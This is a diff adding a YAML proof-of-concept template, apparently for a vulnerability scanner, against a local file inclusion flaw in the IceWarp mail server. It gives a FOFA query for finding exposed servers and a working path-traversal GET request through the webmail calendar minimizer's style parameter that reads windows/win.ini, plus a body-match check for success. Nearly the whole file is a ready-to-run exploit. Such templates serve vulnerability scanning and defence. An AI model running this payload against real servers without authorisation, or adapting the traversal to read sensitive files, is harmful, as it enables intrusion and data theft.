@@ -1,0 +1,22 @@
+id: poc-yaml-icewarp-mail-server-fileread
+info:
+  name: 爱思华宝邮件服务器本地文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: 爱思华宝邮件服务器
+  fofa: title="Icewarp web klient"
+requests:
+- method: GET
+  path: /-.._._.--.._rand/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
+  expression: 'status_code == 200 &&
+
+    contains(body, "bit app support") &&
+
+    contains(body,"fonts") &&
+
+    contains(body,"extensions")
+
+    '
+variables: {}
+transport: http
